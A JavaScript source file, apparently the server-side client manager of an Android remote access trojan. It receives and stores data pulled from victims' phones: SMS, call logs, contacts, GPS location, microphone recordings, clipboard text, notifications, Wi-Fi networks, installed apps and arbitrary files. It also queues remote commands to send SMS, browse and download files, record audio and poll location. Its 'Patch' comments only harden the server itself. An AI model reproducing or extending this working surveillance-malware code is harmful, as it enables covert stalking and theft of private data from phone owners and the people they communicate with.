let CONST = require('./const'),
    fs = require('fs'),
    crypto = require('crypto'),
    path = require('path');

class Clients {
    constructor(db) {
        this.clientConnections = Object.create(null);
        this.gpsPollers = Object.create(null);
        this.clientDatabases = Object.create(null);
        this.ignoreDisconnects = Object.create(null);
        this.instance = this;
        this.db = db;
    }

    // UPDATE

    clientConnect(connection, clientID, clientData) {

        this.clientConnections[clientID] = connection;

        if (clientID in this.ignoreDisconnects) this.ignoreDisconnects[clientID] = true;
        else this.ignoreDisconnects[clientID] = false;

        console.log("Connected -> should ignore?", this.ignoreDisconnects[clientID]);

        let client = this.db.maindb.get('clients').find({ clientID });
        if (client.value() === undefined) {
            // Patch: Limit total unique clients to prevent disk exhaustion
            if (this.db.maindb.get('clients').value().length > 1000) {
                delete this.clientConnections[clientID];
                return connection.disconnect();
            }

            this.db.maindb.get('clients').push({
                clientID,
                firstSeen: new Date(),
                lastSeen: new Date(),
                isOnline: true,
                dynamicData: clientData
            }).write()

            // this being the first run we should ask the client for all existing data?

        } else {
            client.assign({
                lastSeen: new Date(),
                isOnline: true,
                dynamicData: clientData
            }).write()
        }

        let clientDatabase = this.getClientDatabase(clientID);
        this.setupListeners(clientID, clientDatabase);
    }

    clientDisconnect(clientID) {
        console.log("Disconnected -> should ignore?", this.ignoreDisconnects[clientID]);

        const shouldIgnore = this.ignoreDisconnects[clientID];
        if (clientID in this.ignoreDisconnects) delete this.ignoreDisconnects[clientID];

        logManager.log(CONST.logTypes.info, clientID + " Disconnected")
        let client = this.db.maindb.get('clients').find({ clientID });
        if (client.value()) {
            client.assign({
                lastSeen: new Date(),
                isOnline: false,
            }).write();
        }
        
        if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
        if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
        
        // Only delete the DB handle if we are NOT ignoring (a real disconnect/cleanup)
        if (!shouldIgnore && this.clientDatabases[clientID]) delete this.clientDatabases[clientID];
    }

    getClientDatabase(clientID) {
        if (this.clientDatabases[clientID]) return this.clientDatabases[clientID];
        else {
            this.clientDatabases[clientID] = new this.db.clientdb(clientID)
            return this.clientDatabases[clientID];
        }
    }

    setupListeners(clientID) {
        let socket = this.clientConnections[clientID];
        let client = this.getClientDatabase(clientID);

        logManager.log(CONST.logTypes.info, clientID + " Connected")
        socket.on('disconnect', () => {
            // Guard: Only disconnect if this socket is the active one
            if (this.clientConnections[clientID] === socket) {
                this.clientDisconnect(clientID);
            }
        });

        // Run the queued requests for this client
        let clientQue = client.get('CommandQue').value();
        if (clientQue.length !== 0) {
            logManager.log(CONST.logTypes.info, clientID + " Running Queued Commands");
            clientQue.forEach((command) => {
                let uid = command.uid;
                this.sendCommand(clientID, command.type, command, (error) => {
                    if (error) {
                        // Hopefully we'll never hit this point, it'd mean the client connected then immediatly disonnected, how weird!
                        // should we play -> https://www.youtube.com/watch?v=4N-POQr-DQQ 
                        logManager.log(CONST.logTypes.error, clientID + " Queued Command (" + command.type + ") Failed - " + error);
                    } else {
                        // Patch: Guard against missing uid
                        if (command.uid != null) {
                            client.get('CommandQue').remove({ uid: command.uid }).write();
                        }
                    }
                })
            })
        }


        // Start GPS polling (if enabled)
        this.gpsPoll(clientID);


        // ====== DISABLED -- It never really worked, and new AccessRules stop us from using camera in the background ====== //

        // socket.on(CONST.messageKeys.camera, (data) => {

        //     // {
        //     //     "image": <Boolean>,
        //     //     "buffer": <Buffer>
        //     // }

        //     if (data.image) {
        //         let uint8Arr = new Uint8Array(data.buffer);
        //         let binary = '';
        //         for (var i = 0; i < uint8Arr.length; i++) {
        //             binary += String.fromCharCode(uint8Arr[i]);
        //         }
        //         let base64String = window.btoa(binary);

        //         // save to file
        //         let epoch = Date.now().toString();
        //         let filePath = path.join(CONST.photosFullPath, clientID, epoch + '.jpg');
        //         fs.writeFileSync(filePath, Buffer.from(base64String, "base64"), (error) => {
        //             if (!error) {
        //                 // let's save the filepath to the database
        //                 client.get('photos').push({
        //                     time: epoch,
        //                     path: CONST.photosFolder + '/' + clientID + '/' + epoch + '.jpg'
        //                 }).write();
        //             }
        //             else return; // not ok
        //         })
        //     }
        // });

        socket.on(CONST.messageKeys.files, (data) => {
            if (!data || typeof data !== 'object') return;
            // {
            //     "type": "list"|"download"|"error",
            //     (if type = list) "list": <Array>,
            //     (if type = download) "buffer": <Buffer>,
            //     (if type = error) "error": <String> 
            // }

            if (data.type === "list") {
                let list = data.list;
                if (list && Array.isArray(list)) {
                    // Patch 5: Always update, even if list is empty, to prevent stale data
                    client.set('currentFolder', data.list).write();
                    logManager.log(CONST.logTypes.success, "File List Updated");
                } else {
                    // bummer, something happened
                }
            } else if (data.type === "download") {
                // Ayy, time to recieve a file!
                logManager.log(CONST.logTypes.info, "Recieving File From" + clientID);

                // Patch: Guard against null buffer or name
                if (!data.buffer || !data.name || typeof data.name !== 'string') return;
                // Patch: Enforce size limit (100MB)
                if (!Buffer.isBuffer(data.buffer) && !(data.buffer instanceof Uint8Array)) return;
                // Patch: Guard against empty file uploads
                if (data.buffer.length === 0) return logManager.log(CONST.logTypes.error, "Empty file upload from " + clientID);
                if (data.buffer.length > 100 * 1024 * 1024) return logManager.log(CONST.logTypes.error, "File upload too large from " + clientID);

                // Patch 2 & 7: Secure random hex
                let hash = crypto.randomBytes(16).toString('hex');
                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);

                // Patch 3 & 8: Sanitize name
                let sanitizedName = path.basename(data.name);
                let lastDot = sanitizedName.lastIndexOf(".");
                let fileExt = (lastDot !== -1) ? sanitizedName.substring(lastDot).toLowerCase() : '.bin';

                // Patch 9: Whitelist extensions to prevent XSS
                const allowedExts = ['.jpg', '.png', '.mp3', '.mp4', '.txt', '.pdf', '.zip', '.apk', '.bin'];
                if (!allowedExts.includes(fileExt)) fileExt = '.bin';

                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);

                fs.writeFile(filePath, data.buffer, (error) => {
                    if (!error) {
                        // let's save the filepath to the database
                        client.get('downloads').push({
                            time: new Date(),
                            type: "download",
                            // Patch 10: Limit originalName length
                            originalName: sanitizedName.substring(0, 255),
                            path: CONST.downloadsFolder + '/' + fileKey + fileExt
                        }).write();
                        logManager.log(CONST.logTypes.success, "File From" + clientID + " Saved");
                    }
                    else console.log(error); // not ok
                })
            } else if (data.type === "error") {
                // shit, we don't like these! What's up?
                let error = data.error;
                console.log(error);
            }
        });

        socket.on(CONST.messageKeys.call, (data) => {
            if (!data || typeof data !== 'object') return;
            if (data.callsList && Array.isArray(data.callsList)) {
                if (data.callsList.length !== 0) {
                    let callsList = data.callsList.slice(0, 1000); // Cap updates
                    let dbCall = client.get('CallData');
                    let newCount = 0;
                    callsList.forEach(call => {
                        if (!call.phoneNo || !call.date) return;
                        call.phoneNo = String(call.phoneNo).substring(0, 100);
                        call.date = String(call.date).substring(0, 50);
                        let hash = crypto.createHash('md5').update(call.phoneNo + call.date).digest("hex");
                        if (dbCall.find({ hash }).value() === undefined) {
                            // cool, we dont have this call
                            call.hash = hash;
                            dbCall.push(call);
                            newCount++;
                        }
                    });
                    if (newCount > 0) dbCall.write(); // Batch write
                    logManager.log(CONST.logTypes.success, clientID + " Call Log Updated - " + newCount + " New Calls");
                }
            }

        });

        socket.on(CONST.messageKeys.sms, (data) => {
            if (!data || typeof data !== 'object') {
                if (typeof data === "boolean") logManager.log(CONST.logTypes.success, clientID + " SENT SMS");
                return;
            }
            let smsList = data.smslist;
            // Patch 6: Validate smsList
            if (smsList && Array.isArray(smsList) && smsList.length !== 0) {
                let dbSMS = client.get('SMSData');
                let newCount = 0;
                smsList.forEach(sms => {
                    // Patch: Guard against non-string address and body
                    if (!sms.address || !sms.body || typeof sms.address !== 'string' || typeof sms.body !== 'string') return;
                    let hash = crypto.createHash('md5').update(sms.address + sms.body).digest("hex");
                    if (dbSMS.find({ hash }).value() === undefined) {
                        // cool, we dont have this sms
                        sms.hash = hash;
                        dbSMS.push(sms).write();
                        newCount++; // Patch 6: Increment counter
                    }
                });
                logManager.log(CONST.logTypes.success, clientID + " SMS List Updated - " + newCount + " New Messages");
            }
        });

        socket.on(CONST.messageKeys.mic, (data) => {
            if (!data || typeof data !== 'object') return;
            if (data.file && data.name && typeof data.name === 'string' && data.buffer) {
                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);

                // Patch 4: Enforce size limit (10MB for voice)
                if (!Buffer.isBuffer(data.buffer) && !(data.buffer instanceof Uint8Array)) return;
                if (data.buffer.length > 10 * 1024 * 1024) return logManager.log(CONST.logTypes.error, "Voice record too large from " + clientID);

                let hash = crypto.randomBytes(16).toString('hex');
                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                
                let sanitizedName = path.basename(data.name);
                let lastDot = sanitizedName.lastIndexOf(".");
                let fileExt = (lastDot !== -1) ? sanitizedName.substring(lastDot).toLowerCase() : '.unknown';

                // Absolute Final Patch: Whitelist extensions
                const allowedExts = ['.jpg', '.png', '.mp3', '.mp4', '.txt', '.pdf', '.zip', '.apk', '.bin', '.unknown'];
                if (!allowedExts.includes(fileExt)) fileExt = '.bin';

                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);

                fs.writeFile(filePath, data.buffer, (e) => {
                    if (!e) {
                        client.get('downloads').push({
                            "time": new Date(),
                            "type": "voiceRecord",
                            // Patch 10: Limit originalName length
                            "originalName": sanitizedName.substring(0, 255),
                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt
                        }).write();
                    } else {
                        console.log(e);
                    }
                })
            }
        });

        socket.on(CONST.messageKeys.location, (data) => {
            if (data && typeof data === 'object' && Object.keys(data).length !== 0 && data.hasOwnProperty("latitude") && data.hasOwnProperty("longitude")) {
                client.get('GPSData').push({
                    time: new Date(),
                    enabled: !!data.enabled,
                    latitude: Number.isFinite(data.latitude) ? data.latitude : 0,
                    longitude: Number.isFinite(data.longitude) ? data.longitude : 0,
                    altitude: Number.isFinite(data.altitude) ? data.altitude : 0,
                    accuracy: Number.isFinite(data.accuracy) ? data.accuracy : 0,
                    speed: Number.isFinite(data.speed) ? data.speed : 0
                }).write();
                logManager.log(CONST.logTypes.success, clientID + " GPS Updated");
            } else {
                logManager.log(CONST.logTypes.error, clientID + " GPS Recieved No Data");
                logManager.log(CONST.logTypes.error, clientID + " GPS LOCATION SOCKET DATA" + JSON.stringify(data));
            }
        });

        socket.on(CONST.messageKeys.clipboard, (data) => {
            // Patch: Guard against null/undefined clipboard content
            if (!data || typeof data !== 'object') return;
            if (typeof data.text !== 'string' || data.text.length > 1000000) return;
            client.get('clipboardLog').push({
                time: new Date(),
                content: data.text
            }).write();
            logManager.log(CONST.logTypes.info, clientID + " ClipBoard Recieved");
        });

        socket.on(CONST.messageKeys.notification, (data) => {
            if (!data || typeof data !== 'object') return;
            let dbNotificationLog = client.get('notificationLog');
            // Patch: Guard against null/undefined key and content
            if (typeof data.key === 'undefined' && typeof data.content === 'undefined') return;
            let hash = crypto.createHash('md5').update(String(data.key || '') + String(data.content || '')).digest("hex");

            if (dbNotificationLog.find({ hash }).value() === undefined) {
                data.hash = hash;
                dbNotificationLog.push(data).write();
                logManager.log(CONST.logTypes.info, clientID + " Notification Recieved");
            }
        });

        socket.on(CONST.messageKeys.contacts, (data) => {
            if (!data || typeof data !== 'object') return;
            if (data.contactsList && Array.isArray(data.contactsList)) {
                if (data.contactsList.length !== 0) {
                    let contactsList = data.contactsList.slice(0, 1000); // Patch: Cap updates
                    let dbContacts = client.get('contacts');
                    let newCount = 0;
                    contactsList.forEach(contact => {
                        if (!contact.phoneNo) return;
                        contact.phoneNo = contact.phoneNo.replace(/\s+/g, '');
                        let hash = crypto.createHash('md5').update(contact.phoneNo + (contact.name || '')).digest("hex");
                        if (dbContacts.find({ hash }).value() === undefined) {
                            // cool, we dont have this call
                            contact.hash = hash;
                            dbContacts.push(contact).write();
                            newCount++;
                        }
                    });
                    logManager.log(CONST.logTypes.success, clientID + " Contacts Updated - " + newCount + " New Contacts Added");
                }
            }

        });

        socket.on(CONST.messageKeys.wifi, (data) => {
            if (!data || typeof data !== 'object') return;
            if (data.networks && Array.isArray(data.networks)) {
                if (data.networks.length !== 0) {
                    let networks = data.networks.slice(0, 500); // Patch: Cap to 500 items
                    let dbwifiLog = client.get('wifiLog');
                    client.set('wifiNow', networks).write();
                    let newCount = 0;
                    networks.forEach(wifi => {
                        // Patch: Guard against missing SSID or BSSID
                        if (!wifi.SSID || !wifi.BSSID) return;
                        let wifiField = dbwifiLog.find({ SSID: wifi.SSID, BSSID: wifi.BSSID });
                        if (wifiField.value() === undefined) {
                            // cool, we dont have this call
                            wifi.firstSeen = new Date();
                            wifi.lastSeen = new Date();
                            dbwifiLog.push(wifi).write();
                            newCount++;
                        } else {
                            wifiField.assign({
                                lastSeen: new Date()
                            }).write();
                        }
                    });
                    logManager.log(CONST.logTypes.success, clientID + " WiFi Updated - " + newCount + " New WiFi Hotspots Found");
                }
            }
        });

        socket.on(CONST.messageKeys.permissions, (data) => {
            if (!data || typeof data !== 'object') return;
            client.set('enabledPermissions', data.permissions || []).write();
            logManager.log(CONST.logTypes.success, clientID + " Permissions Updated");
        });

        socket.on(CONST.messageKeys.installed, (data) => {
            if (!data || typeof data !== 'object') return;
            client.set('apps', data.apps || []).write();
            logManager.log(CONST.logTypes.success, clientID + " Apps Updated");
        });
    }


    // GET
    getClient(clientID) {
        let client = this.db.maindb.get('clients').find({ clientID }).value();
        if (client !== undefined) return client;
        else return false;
    }

    getClientList() {
        return this.db.maindb.get('clients').value();
    }

    getClientListOnline() {
        return this.db.maindb.get('clients').value().filter(client => client.isOnline);
    }
    getClientListOffline() {
        return this.db.maindb.get('clients').value().filter(client => !client.isOnline);
    }

    getClientDataByPage(clientID, page, filter = undefined) {
        let client = this.db.maindb.get('clients').find({ clientID }).value();
        if (client !== undefined) {
            let clientDB = this.getClientDatabase(client.clientID);
            let clientData = clientDB.value();

            let pageData;
            let safeFilter = (typeof filter === 'string') ? filter : undefined;

            // Patch: Guard against undefined page parameter
            if (!page || typeof page !== 'string') return false;

            if (page === "calls") {
                pageData = clientDB.get('CallData').sortBy('date').reverse().value();
                if (safeFilter) {
                    let filterData = pageData.filter(calls => calls.phoneNo && calls.phoneNo.substr(-6) === safeFilter.substr(-6));
                    if (filterData.length > 0) pageData = filterData;
                }
            }
            else if (page === "sms") {
                pageData = clientData.SMSData;
                if (safeFilter) {
                    let filterData = pageData.filter(sms => sms.address && sms.address.substr(-6) === safeFilter.substr(-6));
                    if (filterData.length > 0) pageData = filterData;
                }
            }
            else if (page === "notifications") {
                pageData = clientDB.get('notificationLog').sortBy('postTime').reverse().value();
                if (safeFilter) {
                    let filterData = pageData.filter(not => not.appName === safeFilter);
                    if (filterData.length > 0) pageData = filterData;
                }
            }
            else if (page === "wifi") {
                pageData = {};
                pageData.now = clientData.wifiNow;
                pageData.log = clientData.wifiLog;
            }
            else if (page === "contacts") pageData = clientData.contacts;
            else if (page === "permissions") pageData = clientData.enabledPermissions;
            else if (page === "clipboard") pageData = clientDB.get('clipboardLog').sortBy('time').reverse().value();
            else if (page === "apps") pageData = clientData.apps;
            else if (page === "files") pageData = clientData.currentFolder;
            else if (page === "downloads") pageData = clientData.downloads.filter(download => download.type === "download");
            else if (page === "microphone") pageData = clientDB.get('downloads').value().filter(download => download.type === "voiceRecord");
            else if (page === "gps") pageData = clientData.GPSData;
            else if (page === "info") pageData = client;

            return pageData;
        } else return false;
    }

    // DELETE
    deleteClient(clientID) {
        this.db.maindb.get('clients').remove({ clientID }).write();
        if (this.clientConnections[clientID]) {
            this.clientConnections[clientID].disconnect();
            delete this.clientConnections[clientID];
        }
        if (this.gpsPollers[clientID]) {
            clearInterval(this.gpsPollers[clientID]);
            delete this.gpsPollers[clientID];
        }
        if (this.clientDatabases[clientID]) delete this.clientDatabases[clientID];
        if (clientID in this.ignoreDisconnects) delete this.ignoreDisconnects[clientID];
    }

    // COMMAND
    sendCommand(clientID, commandID, commandPayload = {}, cb = () => { }) {
        this.checkCorrectParams(commandID, commandPayload, (error) => {
            if (!error) {
                let client = this.db.maindb.get('clients').find({ clientID }).value();
                if (client !== undefined) {
                    commandPayload.type = commandID;
                    if (clientID in this.clientConnections) {
                        let socket = this.clientConnections[clientID];
                        logManager.log(CONST.logTypes.info, "Requested " + commandID + " From " + clientID);
                        socket.emit('order', commandPayload)
                        return cb(false, 'Requested');
                    } else {
                        this.queCommand(clientID, commandPayload, (error) => {
                            if (!error) return cb(false, 'Command queued (device is offline)')
                            else return cb(error, undefined)
                        })
                    }
                } else return cb('Client Doesn\'t exist!', undefined);
            } else return cb(error, undefined);
        });
    }

    queCommand(clientID, commandPayload, cb) {
        let clientDB = this.getClientDatabase(clientID);
        let commandQue = clientDB.get('CommandQue');
        let outstandingCommands = [];
        commandQue.value().forEach((command) => {
            outstandingCommands.push(command.type);
        });

        if (outstandingCommands.includes(commandPayload.type)) return cb('A similar command has already been queued');
        else {
            let uid;
            do {
                uid = crypto.randomBytes(4).readUInt32BE(0) % 10000;
            } while (commandQue.find({ uid }).value());
            
            commandPayload.uid = uid;
            commandQue.push(commandPayload).write();
            return cb(false)
        }
    }

    checkCorrectParams(commandID, commandPayload, cb) {
        if (!commandPayload) return cb('Command Payload Missing');
        if (commandID === CONST.messageKeys.sms) {
            if (!('action' in commandPayload)) return cb('SMS Missing `action` Parameter');
            else {
                if (commandPayload.action === 'ls') return cb(false);
                else if (commandPayload.action === 'sendSMS') {
                    if (!('to' in commandPayload)) return cb('SMS Missing `to` Parameter');
                    else if (!('sms' in commandPayload)) return cb('SMS Missing `to` Parameter');
                    else return cb(false);
                } else return cb('SMS `action` parameter incorrect');
            }
        }
        else if (commandID === CONST.messageKeys.files) {
            if (!('action' in commandPayload)) return cb('Files Missing `action` Parameter');
            else {
                if (commandPayload.action === 'ls') {
                    if (!('path' in commandPayload)) return cb('Files Missing `path` Parameter')
                    else return cb(false);
                }
                else if (commandPayload.action === 'dl') {
                    if (!('path' in commandPayload)) return cb('Files Missing `path` Parameter')
                    else return cb(false);
                }
                else return cb('Files `action` parameter incorrect');
            }
        }
        else if (commandID === CONST.messageKeys.mic) {
            if (!('sec' in commandPayload)) return cb('Mic Missing `sec` Parameter')
            else cb(false)
        }
        else if (commandID === CONST.messageKeys.gotPermission) {
            if (!('permission' in commandPayload)) return cb('GotPerm Missing `permission` Parameter')
            else cb(false)
        }
        else if (Object.values(CONST.messageKeys).indexOf(commandID) >= 0) return cb(false)
        else return cb('Command ID Not Found');
    }

    gpsPoll(clientID) {
        if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);

        let clientDB = this.getClientDatabase(clientID);
        let gpsSettings = clientDB.get('GPSSettings').value();
        if (!gpsSettings) return;

        // Patch: Guard against non-numeric updateFrequency
        if (typeof gpsSettings.updateFrequency === 'number' && gpsSettings.updateFrequency >= 30) {
            const freq = Math.min(gpsSettings.updateFrequency, 86400);
            this.gpsPollers[clientID] = setInterval(() => {
                logManager.log(CONST.logTypes.info, clientID + " POLL COMMAND - GPS");
                this.sendCommand(clientID, '0xLO')
            }, freq * 1000);
        }
    }

    setGpsPollSpeed(clientID, pollevery, cb) {
        if (pollevery >= 30) {
            let clientDB = this.getClientDatabase(clientID);
            clientDB.get('GPSSettings').assign({ updateFrequency: pollevery }).write();
            cb(false);
            this.gpsPoll(clientID);
        } else return cb('Polling Too Short!')

    }
}

module.exports = Clients;
